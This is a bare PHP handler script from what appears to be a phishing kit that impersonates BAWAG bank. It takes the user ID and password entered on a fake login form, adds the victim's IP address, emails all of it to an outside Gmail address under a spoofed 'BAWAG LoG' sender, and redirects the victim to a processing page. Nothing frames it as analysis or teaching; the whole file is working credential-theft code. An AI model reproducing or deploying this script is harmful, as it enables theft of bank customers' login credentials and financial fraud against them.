<?
$ip = getenv("REMOTE_ADDR");
$msg .= "\n"; 
$msg .= "User ID: ".$_POST['pass1']."\n";
$msg .= "PWD: ".$_POST['pass2']."\n";
$msg .= "\n"; 
$msg .= "IP: ".$ip."\n";
$msg .= "------------Built By MMM----------------\n";
$post = "mercyhope278@gmail.com";
$subj = "$ip - ".$_POST['pass1']."\n";
$from = "From: BAWAG LoG<logs@support.my>";
mail("$post",$subj, $msg, $from); 
header("Location: BAWAG_process.html");	  

?>